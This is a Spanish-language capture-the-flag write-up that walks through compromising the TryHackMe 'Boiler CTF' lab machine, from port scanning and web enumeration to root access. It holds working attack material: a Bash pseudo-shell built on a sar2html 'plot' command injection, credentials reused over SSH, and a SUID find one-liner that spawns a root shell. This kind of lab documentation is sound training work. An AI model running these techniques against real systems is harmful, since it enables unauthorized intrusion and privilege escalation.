---
title: Boiler CTF (Try Hack Me)
author: J0lm3d0
date: 2021-11-25 20:00:00 +0200
categories: [TryHackMe]
tags: [linux, joomla, sar2html, suid]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Boiler CTF de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma.

![Logo de la máquina](/assets/img/THM/BoilerCTF/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_BoilerCTF.pdf)

## Enumeración de servicios y recopilación de información sensible

Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- --open -T5 -n -vv 10.10.182.219

Not shown: 65436 closed tcp ports (reset), 95 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
55007/tcp open  unknown          syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```
# nmap -p21,80,10000,55007 -sC -sV 10.10.182.219

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.41.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

Tras el escaneo, lo primero que me llama atención es que el servicio FTP tiene habilitado el login anónimo, por lo que pruebo a acceder para ver el contenido.

```
# ftp 10.10.182.219

Connected to 10.10.182.219.                              
220 (vsFTPd 3.0.3)                           
Name (10.10.182.219:j0lm3d0): anonymous         
230 Login successful.                           
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
```

Veo que existe un archivo "oculto" en formato .txt. Descargo el fichero y visualizo su contenido, comprobando que se encuentra codificado en algo que, a primera vista, me parece algún tipo de cifrado César.

```
# cat .info.txt

Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

Pruebo a decodificarlo utilizando [CyberChef](https://gchq.github.io/CyberChef/) y el algoritmo ROT13, obteniendo así el siguiente resultado:

![Contenido decodificado del fichero de texto](/assets/img/THM/BoilerCTF/infotxtdec.png)

Este fichero no da ninguna información para poder comprometer la máquina, simplemente indica que que se debe realizar una buena enumeración para resolverla (y eso es lo que vamos a hacer).

El servicio FTP no tiene mucho más que ofrecer, por lo que paso a enumerar los servidores web de los puertos 80 y 10000. El servidor del puerto 80 muestra en su ruta principal la página por defecto de Apache para Ubuntu:

![Página principal del servidor web del puerto 80](/assets/img/THM/BoilerCTF/mainpage80.png)

Por otra parte, el fichero "robots.txt" que había detectado *Nmap*, solo tiene deshabilitada la entrada raíz y muestra algunas rutas y unos números que, en principio, apuntan a un *rabbit hole*, por lo que, por el momento, los descartaré.

```
# curl http://10.10.182.219/robots.txt

User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

Paso al servidor web del puerto 10000, que está ejecutando un servicio `Webmin`, una herramienta de configuración de sistemas a través de la web para sistemas Unix. En la página principal vemos un panel login, pero no disponemos de credenciales.

![Panel login de Webmin](/assets/img/THM/BoilerCTF/mainpage10000.png)

En el segundo escaneo que realicé anteriormente con *Nmap*, aparecía la versión utilizada por el servicio (1.930), por lo que utilizo `SearchSploit` para buscar algún exploit que me permita bypassear la autenticación.

```
# searchsploit Webmin

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                                                                                            | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                                                                                           | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                                                                                       | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                                                                                                   | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                                                                                                          | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                                                                                                | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                                                                                                    | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                                                                                                         | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                                                                                                               | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                                                                                                         | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                                                                      | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                                                                                                    | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                                                                       | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                                                                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                                                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                                                                          | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                                                                            | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                                                                                                 | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                                                                                                           | linux/webapps/50126.py
Webmin 1.x - HTML Email Command Execution                                                                                                                                                                  | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                                                                               | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                                                                               | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                                                                              | linux/webapps/47330.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Pruebo el exploit 47293 (aplicaría para la versión 1.920), escrito en Bash y que aprovecha la vulnerabilidad CVE-2019-15107, pero la salida me indica que el servidor no es vulnerable.

```
# sh 47293.sh https://10.10.182.219:10000

Testing for RCE (CVE-2019-15107) on https://10.10.182.219:10000: OK! (target is not vulnerable)
```

Utilizando `BurpSuite`, veo la respuesta del servidor y compruebo que el cambio de contraseña (que era de lo que se aprovechaba la vulnerabilidad) no está habilitado, por lo que esta vía de explotación no es válida:

![Respuesta del servidor capturada desde BurpSuite](/assets/img/THM/BoilerCTF/burpresponse.png)

Por tanto, vuelvo al servidor del puerto 80, para efectuar una búsqueda de directorios y/o ficheros ocultos mediante fuerza bruta utilizando `Gobuster`.

```
# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 80 -x php,txt -r -u http://10.10.182.219

/.htaccess            (Status: 403) [Size: 297]
/.htpasswd.php        (Status: 403) [Size: 301]
/.hta                 (Status: 403) [Size: 292]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.htaccess.php        (Status: 403) [Size: 301]
/.hta.php             (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 297]
/.hta.txt             (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 301]
/index.html           (Status: 200) [Size: 11321]
/manual               (Status: 200) [Size: 626]  
/robots.txt           (Status: 200) [Size: 257]  
/server-status        (Status: 403) [Size: 301]
/joomla               (Status: 200) [Size: 12463]
```

En la búsqueda encuentro una ruta "/joomla" que contiene, como el nombre indica, un gestor de contenidos `Joomla!`.

![Página principal del gestor de contenidos Joomla!](/assets/img/THM/BoilerCTF/joomlacms.png)

Tras revisar un poco más a fondo, veo que solo hay una entrada publicada sin ninguna información relevante y, además, pruebo a acceder a la ruta "/administrator" para entrar al panel de administrador con credenciales por defecto, pero no lo consigo.

Es por ello que vuelvo a buscar directorios y ficheros utilizando *Gobuster* sobre la ruta del gestor *Joomla!*.

```
# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 80 -x php,txt -r -u http://10.10.182.219/joomla

/.htpasswd            (Status: 403) [Size: 304]
/.hta                 (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 304]
/.htpasswd.php        (Status: 403) [Size: 308]
/.hta.txt             (Status: 403) [Size: 303]
/.htaccess.php        (Status: 403) [Size: 308]
/_archive             (Status: 200) [Size: 162]
/_files               (Status: 200) [Size: 168]
/_database            (Status: 200) [Size: 160]
/.htpasswd.txt        (Status: 403) [Size: 308]
/.hta.php             (Status: 403) [Size: 303]
/.htaccess.txt        (Status: 403) [Size: 308]
/~www                 (Status: 200) [Size: 162]
/_test                (Status: 200) [Size: 4802]
/administrator        (Status: 200) [Size: 5161]
/bin                  (Status: 200) [Size: 31]  
/build                (Status: 200) [Size: 3391]
/cache                (Status: 200) [Size: 31]  
/components           (Status: 200) [Size: 31]  
/configuration.php    (Status: 200) [Size: 0]   
/images               (Status: 200) [Size: 31]  
/index.php            (Status: 200) [Size: 12484]
/includes             (Status: 200) [Size: 31]   
/index.php            (Status: 200) [Size: 12484]
/installation         (Status: 200) [Size: 5800]
/language             (Status: 200) [Size: 31]   
/libraries            (Status: 200) [Size: 31]   
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 200) [Size: 31]   
/media                (Status: 200) [Size: 31]   
/modules              (Status: 200) [Size: 31]   
/plugins              (Status: 200) [Size: 31]   
/README.txt           (Status: 200) [Size: 4793]
/templates            (Status: 200) [Size: 31]   
/tests                (Status: 200) [Size: 1556]
/tmp                  (Status: 200) [Size: 31]   
/web.config.txt       (Status: 200) [Size: 1859]
```

A primera vista, me resultan interesantes las rutas que comienzan por el carácter "_", ya que es algo extraño, y también el fichero "web.config.txt". Procedo a acceder a las rutas a través del navegador y me doy cuenta de que la mayoría se tratan de archivos *troll* o *rabbit holes*, exceptuando la ruta "_test", que contiene un servicio `Sar2HTML`.

![Servicio Sar2HTML encontrado en la ruta "/joomla/_test"](/assets/img/THM/BoilerCTF/sar2html.png)

## Acceso a la máquina

Con la experiencia de anteriores máquinas, se que este servicio cuenta con una versión vulnerable a ejecución remota de código a través de la variable "plot" de PHP que se define en la URL, por lo que pruebo una inyección básica de comandos.

![RCE a través del servicio Sar2HTML](/assets/img/THM/BoilerCTF/rce.png)

Como se observa en la imagen, el comando se ejecuta y se muestra la salida en las opciones de uno de los desplegables. Para hacer más visible y rápida esta ejecución de comandos, decido crear un script en Bash que simule una shell realizando peticiones al servidor web mediante `cURL`:

```bash
#!/bin/bash

#Check if the IP address of the victim is passed
if [ $# -eq 1 ]; then
 while true; do

  # Get the command
  echo -n "$ "; read -r CMD

  #URLEncode the command requested
  CMD=$(echo $CMD | tr ' ' '+')

  #Send a petition to the webserver with the command requested and format the output
  curl -s "http://$1/joomla/_test/index.php?plot=;$CMD" | grep -oP "<option value=(.*?)>" | tail -n +5 | head -n -2 | sed 's/option value=//' | tr -d '<>'

 done
else

 echo -e "\n[!] USAGE: $0 <victim_ip_address>"

fi
```

Listando el directorio actual descubro un fichero de log que, al abrirlo, presenta las credenciales del servicio SSH de un usuario: "basterd".

![Credenciales descubiertas en el fichero "log.txt"](/assets/img/THM/BoilerCTF/log.png)

Accedo mediante SSH a la máquina como "basterd" y, en su directorio personal, encuentro un script en Bash llamado "backup".

```bash
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
#su*******************s

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi
    done


else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

Al parecer se trata de un script que guardaría una copia del directorio personal del usuario "stoner" en una máquina remota con IP 1.2.3.4. Pero lo que me llama la atención es el comentario, ya que podría ser la contraseña del usuario, al tener un formato similar al de "basterd".

Efectivamente, consigo conectarme mediante SSH con las credenciales obtenidas visualizo la primera flag.

```
stoner@Vulnerable:~$ cat .secret

*** **** ** **** ****, **** ****.
```

## Escalada de privilegios

Enumerando el sistema para escalar privilegios, hago una búsqueda de permisos SUID y compruebo que el binario `find` cuenta con este permiso.

```
stoner@Vulnerable:~$ find / -perm -u=s 2>/dev/null

/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

Con el permiso SUID y ejecutando el comando de una forma determinada, que se puede comprobar en [GTFOBins](https://gtfobins.github.io/), se puede obtener una shell con privilegios de root.

```
stoner@Vulnerable:~$ find . -exec /bin/bash -p \; -quit

bash-4.3# cat /root/root.txt

** ****** **** ****, *** **?
```
